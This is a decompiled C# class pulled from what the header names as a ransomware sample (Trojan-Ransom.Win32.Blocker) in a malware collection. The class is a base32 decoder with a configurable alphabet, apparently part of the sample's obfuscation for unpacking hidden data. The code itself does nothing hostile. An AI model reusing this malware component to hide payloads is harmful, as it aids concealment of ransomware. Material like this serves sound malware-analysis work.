// Decompiled with JetBrains decompiler
// Type: meknow
// Assembly: cool, Version=7.5.0.9, Culture=neutral, PublicKeyToken=null
// MVID: C11E69EF-CCC7-47A7-8251-5FB6DF86E9DF
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Blocker.bssu-5ebb6150d362ee609838b09602335faabada06e2b0637ab6719cc3d84bbd59c2.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;

public class meknow
{
  public const char StandardPaddingChar = '=';
  public const string urlStandardAlphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
  public const string ZurlAlphabet = "ybndrfg8ejkmcpqxot1uwisza345h769";
  public char PaddingChar;
  public bool UsePadding;
  public bool IsCaseSensitive;
  public bool IgnoreWhiteSpaceWhenDecoding;
  private readonly string _alphabet;
  private Dictionary<string, uint> _index;
  private Dictionary<string, Dictionary<string, uint>> _indexes = new Dictionary<string, Dictionary<string, uint>>(2, (IEqualityComparer<string>) StringComparer.InvariantCulture);

  public meknow()
    : this(false, false, false, "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567")
  {
  }

  public meknow(bool padding)
    : this(padding, false, false, "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567")
  {
  }

  public meknow(bool padding, bool caseSensitive)
    : this(padding, caseSensitive, false, "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567")
  {
  }

  public meknow(bool padding, bool caseSensitive, bool ignoreWhiteSpaceWhenDecoding)
    : this(padding, caseSensitive, ignoreWhiteSpaceWhenDecoding, "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567")
  {
  }

  public meknow(string alternateAlphabet)
    : this(false, false, false, alternateAlphabet)
  {
  }

  public meknow(
    bool padding,
    bool caseSensitive,
    bool ignoreWhiteSpaceWhenDecoding,
    string alternateAlphabet)
  {
    int length = alternateAlphabet.Length;
    this.PaddingChar = '=';
    this.UsePadding = padding;
    this.IsCaseSensitive = caseSensitive;
    this.IgnoreWhiteSpaceWhenDecoding = ignoreWhiteSpaceWhenDecoding;
    this._alphabet = alternateAlphabet;
  }

  public byte[] lol(string input, string input2) => new meknow().Decode(input);

  public byte[] Decode(string input)
  {
    if (this.IgnoreWhiteSpaceWhenDecoding)
      input = Regex.Replace(input, "\\s+", "");
    if (this.UsePadding)
      input = input.Length % 8 == 0 ? input.TrimEnd(this.PaddingChar) : throw new ArgumentException("Invalid length for a url string with padding.");
    this.EnsureAlphabetIndexed();
    MemoryStream memoryStream = new MemoryStream(Math.Max((int) Math.Ceiling((double) (input.Length * 5) / 8.0), 1));
    for (int index1 = 0; index1 < input.Length; index1 += 8)
    {
      int num1 = Math.Min(input.Length - index1, 8);
      ulong num2 = 0;
      int count = (int) Math.Floor((double) num1 * 0.625);
      for (int index2 = 0; index2 < num1; ++index2)
      {
        uint num3;
        if (!this._index.TryGetValue(input.Substring(index1 + index2, 1), out num3))
          throw new ArgumentException("Invalid character '" + input.Substring(index1 + index2, 1) + "' in url string, valid characters are: " + this._alphabet);
        num2 |= (ulong) num3 << (count + 1) * 8 - index2 * 5 - 5;
      }
      byte[] bytes = BitConverter.GetBytes(num2);
      Array.Reverse((Array) bytes);
      memoryStream.Write(bytes, bytes.Length - (count + 1), count);
    }
    return memoryStream.ToArray();
  }

  private void EnsureAlphabetIndexed()
  {
    if (this._index != null)
      return;
    string key = (this.IsCaseSensitive ? "S" : "I") + this._alphabet;
    Dictionary<string, uint> dictionary;
    if (!this._indexes.TryGetValue(key, out dictionary))
    {
      lock (this._indexes)
      {
        if (!this._indexes.TryGetValue(key, out dictionary))
        {
          dictionary = new Dictionary<string, uint>(this._alphabet.Length, this.IsCaseSensitive ? (IEqualityComparer<string>) StringComparer.InvariantCulture : (IEqualityComparer<string>) StringComparer.InvariantCultureIgnoreCase);
          for (int startIndex = 0; startIndex < this._alphabet.Length; ++startIndex)
            dictionary[this._alphabet.Substring(startIndex, 1)] = (uint) startIndex;
          this._indexes.Add(key, dictionary);
        }
      }
    }
    this._index = dictionary;
  }
}
